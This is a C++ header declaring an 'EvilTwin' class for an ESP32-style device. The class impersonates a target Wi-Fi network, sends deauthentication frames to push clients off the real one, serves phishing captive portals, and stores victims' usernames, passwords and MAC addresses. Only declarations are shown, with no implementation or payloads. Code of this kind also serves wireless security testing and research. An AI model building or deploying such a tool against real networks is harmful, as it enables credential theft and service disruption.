#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include "HardwareManager.h"
#include "WifiManager.h"
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <memory>
#include <string>
#include <vector> // Add vector include

// A simple struct to hold all captured data for one victim
struct VictimCredentials {
    std::string clientMac;
    std::string username;
    std::string password;
};

class EvilTwin {
public:
    EvilTwin();
    void setup(App* app);
    void loop();

    void prepareAttack();
    bool start(const WifiNetworkInfo& targetNetwork);
    void stop();
    
    void setSelectedPortal(const std::string& portalName);

    bool isActive() const;
    bool isAttackPending() const;
    const WifiNetworkInfo& getTargetNetwork() const;
    int getVictimCount() const;

private:
    void startWebServer();
    void deauthRoutine();
    
    // Web server handlers
    void handleCaptivePortal(AsyncWebServerRequest* request);
    void handleLogin(AsyncWebServerRequest* request);

    // --- NEW: WiFi Event Handler ---
    static void onStationConnected(WiFiEvent_t event, WiFiEventInfo_t info);

    App* app_;
    std::unique_ptr<HardwareManager::RfLock> rfLock_;
    
    // Attack State
    bool isActive_;
    bool isAttackPending_;
    WifiNetworkInfo targetNetwork_;
    std::vector<VictimCredentials> capturedCredentials_;
    std::string selectedPortal_;
    std::string lastClientMac_; // <-- To store the MAC from the event

    // Attack Components
    AsyncWebServer webServer_;
    DNSServer dnsServer_;
    
    // Timing
    unsigned long lastDeauthTime_;

    // Deauth packet template
    static const uint8_t deauth_frame_template[];
    
    // --- NEW: Static instance pointer for the callback ---
    static EvilTwin* instance_;
};

#endif // EVIL_TWIN_H